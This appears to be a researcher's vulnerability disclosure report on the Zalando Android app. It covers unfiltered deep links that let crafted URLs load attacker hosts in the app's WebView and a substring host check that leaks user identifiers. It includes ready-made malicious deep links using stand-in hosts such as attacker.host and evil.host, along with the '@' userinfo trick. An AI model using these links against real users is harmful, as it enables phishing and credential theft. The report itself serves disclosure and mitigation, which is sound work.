# Summary of Deep Link related vulnerabilities in "Zalando" Android App (`de.zalando.mobile`, Version `v5.10.1`)

**Author: Marcus Mengs (@MaMe82)**
**Date: Aug-24-2021**


The "Zalando" Android App allows external interaction via Deep Links with the custom scheme `zalando://`. There exist no further restrictions, like filters for specific hosts or paths, for those Deep Links.

Relevant excerpt `AndroidManifest.xml`:

```
        <activity android:theme="@style/ZalandoFullScreenTheme" android:name="de.zalando.mobile.ui.start.SplashActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="zalando"/>
            </intent-filter>
            <meta-data android:name="android.app.shortcuts" android:resource="@xml/shortcuts"/>
        </activity>
```

Ultimately the host-part and path-component of Deep Links matching this scheme, have to be handled by the application logic. Inspection of the app code uncovers various Deep Link formats, which could trigger actions. A few examples:

```
zalando://CUCA_CHAT...
zalando://ROOT...
zalando://CATEGORIES...
zalando://WISHLIST...
zalando://DIGITAL_GIFT_CARDS_EMAIL...
```

These examples show, that the App uses the **host part** of the deep links, in order to route to different application components, while no global (OS-based) filters are applied to this part in the Manifest file. Ultimately, the application logic gets responsible for sanitization/filtering of the host-component of Deep Link URLs. Unfortunately, the logic fails on this. The same is true for the path-component of Deep Link URLs. This results in issues which I cover in this report.

## 1. Deep Link vulnerability 1: `zalando://STREET_VIEW`

The Deep Link target `zalando://STREET_VIEW` obviously is/was tied to the "Street it all" Campaign. 

The expected Deep Link URLs look something like this:

```
zalando://STREET_VIEW?path=<target path>
```

For a Deep-Link-host-component of `STREET_VIEW` the app logic creates an Intent for the Activity `de.zalando.mobile.ui.webview.WebViewWeaveActivity`. The intent carries the following Extras:

- `intent_extra_title`: title which should be shown by the activity (`"Street it all"` in this case )
- `show_street_view`: boolean, set to `true`
- `intent_extra_url`: URL for a web page, which should be displayed by the activity. The web page itself gets rendered by `de.zalando.mobile.ui.webview.ZalandoWebView` (which inherits from `android.webkit.WebView`)

The interesting part, of course, is the URL string which ends up in `intent_extra_url`, which gets requested and rendered by the `ZalandoWebView`. This value gets constructed by a concatenation of the string `"https://en.zalando.de"` and the value **of the query parameter `path` from the Deep Link.**

So for the Deep Link `zalando://STREET_VIEW?path=/index.html` the create `intent_extra_url` would be formed as: 

```
https://en.zalando.de/index.html
```

This causes an issue, because the `/`, which serves as delimiter between the host-component and the path-component of the resulting URL, **is expected to be part of the value of the query parameter `path`. Omitting this delimiting character would lead to unexpected results.

For example a Deep Link `zalando://STREET_VIEW?path=foo` would get translated to the following URL, with an invalid hostname:

```
https://en.zalando.defoo
```

This misbehavior is exploitable. An attacker could craft ,malicious Deep Links with arbitrary hostnames, paths and queries. The only thing which could not be manipulated is the scheme (`https`) of the resulting URLs. Moreover, the WebView which renders the URLs has JavaScript enabled and obviously has cookies stored for relevant `*.zalando.de` domains. This widens the attack surface for JavaScript-based CSRF attacks.

*Note on CSRF: If an attacker enforces requests to domains with malicious JavaScripts based on the Deep-Link-issue, the JS code would not be able to collect HTTP responses. This is because the Same Origin Policy would get violated. Yet, even if no response could be fetched, the respective XHR request could be send towards *.zalando.de (including stored HTTP-only cookies). It took no further efforts, to work out CSRF examples, in order to increase the severity of the report. The possibilities should be obvious.*

At this point, I want to give two examples on how to exploit this logical flaw, to request attacker controlled URLs from within the Zalando App (internal WebView).

### 1.1 Example 1

```
zalando://STREET_VIEW?path=.attacker.host/arbitrary/path?arbitrary=param
```

The Deep Link above would result in the following URL, which would get requested and rendered by `ZalandoWebView`:

```
https://en.zalando.de.attacker.host/arbitrary/path?arbitrary=param
```

### 1.2 Example 2

As there is no hostname validations for the generate URLs, another - less obvious - attack is possible, which does not require to register domains with host records starting with `en.zalando.de.*` (as shown in example 1).

According to [RFC 3986, Section 3.2](https://datatracker.ietf.org/doc/html/rfc3986#section-3.2) the authority of a (HTTP) URI not only consists of the host part, but also of optional components:

```
authority   = [ userinfo "@" ] host [ ":" port ]
```

With this aspect in mind, the enforced `"en.zalando.de"` host could be modified to serve as `userinfo` by adding in a `@` character. A crafted Deep Link would look like this:

```
zalando://STREET_VIEW?path=a@attacker.host/arbitrary/path?arbitrary=param
```

... and resolve to this URL:


```
https://en.zalando.de:a@attacker.host/arbitrary/path?arbitrary=param
```

In this case, the string `en.zalando.de` would get interpreted as username (with password `a`), while the real host gets `attacker.host`. This allows an attacker to request arbitrary domains, as most of them just ignore the userinfo for `http`.


### 1.3 Additional Notes on this example

The `WebViewWeaveActivity` does not display the URL which was requested for rendering, which makes phishing attacks easier (instead the title "Stret it All" gets displayed).

If the `STREET_VIEW` Deep Link has no `path` parameter or the value of the `path` parameter is empty, the string representation of the URL-path gets translated to `null` and results in an URL transformation to `https://en.zalando.denull`. This is mentioned, because makes it way easier to discover this vulnerability, just by testing obvious Deep Link targets, which are easy to spot in the code (not obfuscated).

The underlying WebViews support Client-cahcing, which means if the same crafted Deep Link is used more than once (resulting in the same URL each time), it is not guaranteed that this triggers more than one HTTP request. An attacker can overcome this, by adding a random value to the query parameters, for each generated Deep Link, in order to assure that each link leads results in a HTTP request (cache buster).

## 2. Deep Link vulnerability 2: `zalando://MAGAZINE`

I keep this section shorter, as most fundamental aspects have been described in the section for "Deep Link Vulnerability 1".

Deep Links starting with `zalando://MAGAZINE` trigger Intents for the component `de.zalando.mobile.ui.webview.inspiration.InspirationWebViewActivity`. This Activity, again, uses `ZalandoWebView` to request and render content from an URL, which is provided in the `intent extra` named `intent_extra_url`.

While this Deep Link behaves similar to `zalando://STREET_VIEW` it does not construct the target URL for `ZalandoWebView` from a query parameter, but from the **path component** of the Deep Link.

For example the deep link `zalando://MAGAZINE/second` would translate to a requested URL of:

```
https://en.zalando.de/second?cmsversion=NEWFACE...
```

The query parameter `cmsversion=NEWFACE` gets appended by the application code automatically.

For the translation from the provide Deep Link to the final request URL, the `zalando://MAGAZINE` part of the string gets replaced with `https://en.zalando.de`. The rest of the string is kept, without further sanitization or filtering.

This could be exploited in similar fashion, like described in the first issue:

### 2.1 Example 1

The Deep Link `zalando://MAGAZINE.evil.host/something` results in the following URL, which gets requested by `ZalandoWebView`:

```
https://en.zalando.de.evil.host/something?cmsversion=NEWFACE...
```


### 2.2 Example 2

The Deep Link `zalando://MAGAZINE:a@evil.host/something` results in the following URL, which gets requested by `ZalandoWebView`:

```
https://en.zalando.de:a@evil.host/something?cmsversion=NEWFACE
```


## 2.3 Additional notes for this example

In contrast to the visualization for the "Street View", the `InspirationWebViewActivity` use here, renders a part of the requested URL. This is not much of an issue for an attacker, as a malicious target host could still be prefixed with  legit looking components. Even worse, a target host like `magazine.zalando.de.evil.host` would render as `https://magazine.zalando.d..`, which could make phishing attacks more plausible (for my test devices, the first 18 characters of the hostname got rendered).

In addition to the title, this activity applies some modifications to the style of the WebView which help to allign content with Zalandos Corporate Design (Orange colors for text markers, different fonts etc..)

Otherwise the notes from previous sections apply.

## 3. Information Leakage Vulnerability in `ZalandoWebView`

The `ZalandoWebView` component played a role in both vulnerabilities described, so far.

Essentially this class extends `android.webkit.WebView`, but adds some logic to the `loadUrl()` method.

To be precise: Depending on the URL provided to `loadUrl()` additional query parameters and a request header get added:

### Additional header
```
x-zalando-mobile-app:       1166 **redacted**
```

### Additional query parameters
```
uId:        3a11 **redacted**
appVersion: 5.10.1
appCountry: DE-EN
clientId:   d730 **redacted**
appName:    Zalando
appId:      de.zalando.mobile
```

Those user related parameters, which could also get useful for CSRFs, could easily fetched by an attacker. This is, because the logic which optionally adds them works like this:

```
if (url.getHost().contains("zalando")) {
    // add Zalando specific parameters and header
}
```

The problem is pretty obvious. Instead of validating the full host name, all hosts **containing** "zalando" fulfill these condition (not case sensitive).

This applies to hosts like `FrantAlanDora.de`, as well as to hosts from earlier examples, like `en.zalando.de.attacker.host`.

Combined with the first two vulnerabilities, this allows easy information extraction, which could further support extended exploit chains.

## 4. Relevance/Impact

First of all, it should be mentioned that there are various ways, to trigger such deep link exploits. The most obvious would be to place such a malicious Deep Link in a Webpage and trick user into clicking the link. This could be semi-automated, as Deep Links could be triggered via JavaScript, if the user visits a malicious page with the browser of his mobile (with Zalando App installed). A less common way to ship Deep Links to innocent users, would be QRCodes. This gained great relevance nowadays, because of the fact, that many digital Covid-tracing solutions rely on the fact, that users scan (untrusted) QRCodes with there mobile phones.


Beside abusing this as "open redirect", CSRF attacks get possible (as described earlier). I also did some tests on XSS which did NOT succeed. To be precise: Of course it is possible to execute arbitrary JavaScript in the WebViews of the Zalando App, but I did not manage to inject JS code into WebViews rendering the `en.zalando.de`. Yet, I can not safely exclude that this is possible. The main reason for this: I have no test device, which still suffers from `CVE-2020-6506`. If the Zalando App is running on a device affected by the flaw describe in this CVE, the issues described here could serve as door-opener for **Universal XSS** in any web page.

The most realistic scenario - for an attacker to exploit this issue - would be classical phishing. For example, an attacker could host a fake login page, to steal credentials of Zalando user. This gets even easier, because the app provides no visual indication, that the content rendered in the App is not part of Zalando (specifically: Malicious host URLs are not shown, at all, or only the first few letters are shown, which allows an attacker to make them appear as legit Zalando-URLs).

## 5. Root cause / Mitigation

### 5.1 Improper Input filtering

It has to be enforced, that the path parameter (example 1) has a slash `/` as first character (or the slash gets appended to the hostname part, which is used when constructing the URL for the WebView)

### 5.2 Improper Output encoding

The characters for intended query parameters have to be URL-encoded, to prevent characters like `:`, `@` and so on.

### 5.3 Lack of URL-component (host) validation

While the `*WebView.loadUrl()` method only accepts an URL parameter of type string, it is still possible to cast it to `java.net.URL` in order to sanitize URL components in accordance to RFC 3968. Although `ZalandoWebView` fails on proper host sanitization, it already does this conversion. This offers the opportunity to prevent tinkering with the authority part of provided URLS. For example `new URL("https://en.zalando.de:a@evil.host").getHost()` would return `evil.host` and thus deal with the issues described in the section "Deep Link vulnerability 1".

### 5.4 OS scoped Deep Link filters

Valid "host name components" and intended "paths" for legit Deep Links could be included in the `AndroidManifest.xml` to enforce OS-based filtering. As valid Deep Link targets could be easily extracted from the app logic, the "value" of the "disclosed" information presented in the Manifest (to a possible attacker) is low, compared to the risk of omitting OS-level filtering for HOST- and PATH-components of Deep Links.

### 5.5 Event Logs

Of course I am not able to draw conclusions on how these flaws have been used "in the wild", but: It is worth mentioning that each and every Deep Link passing the Zalando app gets logged to the `https://en.zalando.de/api/mobile/v3/events` endpoint. While I consider this a somehow "heavy" form of user tracking, it could at least help to uncover misuse of Deep Links in the past.

